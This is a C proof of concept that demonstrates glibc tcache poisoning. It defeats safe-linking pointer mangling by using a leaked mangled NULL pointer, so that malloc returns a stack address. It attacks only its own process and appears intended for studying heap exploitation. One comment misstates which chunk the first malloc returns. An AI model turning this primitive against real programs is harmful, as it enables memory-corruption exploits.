#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

int main(void) {
    // Target buffer on the stack
    char target[30] = "42T";
    printf("Target address : %p\n", (void *)target);

    // Allocate and initialize chunk
    char *ptr = malloc(24);
    memset(ptr, 'c', 23);
    ptr[23] = '\0';
    printf("Allocated ptr  : %p\n", (void *)ptr);

    char *ptr2 = malloc(24);
    memset(ptr2, 'c', 23);
    ptr2[23] = '\0';
    printf("Allocated ptr  : %p\n", (void *)ptr2);

    // Free chunk into tcache
    free(ptr);
    free(ptr2);


    uint64_t *l_ptr = (uint64_t *)ptr;
    uint64_t *l_ptr2 = (uint64_t *)ptr2;

    printf("Mangled NULL fd: 0x%016lx\n", *l_ptr);
    printf("Mangled HEAD T fd: 0x%016lx\n", *l_ptr2);


    // Poison fd: (*l_ptr holds 'Pos >> 12', so XORing with target yields 'PROTECT_PTR(Pos, Target)')
    *l_ptr2 = (*l_ptr) ^ ((uintptr_t)target);
    printf("Poisoned fd2    : 0x%016lx\n", *l_ptr2);

    // 1st malloc: Returns 'ptr' and promotes 'target' to tcache head
    char *p1 = malloc(24);
    printf("1st malloc     : %p (Popped ptr)\n", (void *)p1);

    // 2nd malloc: Returns target address from tcache head
    char *p2 = malloc(24);
    printf("2nd malloc     : %p (Target returned! Content: %s)\n", (void *)p2, p2);


    return 0;
}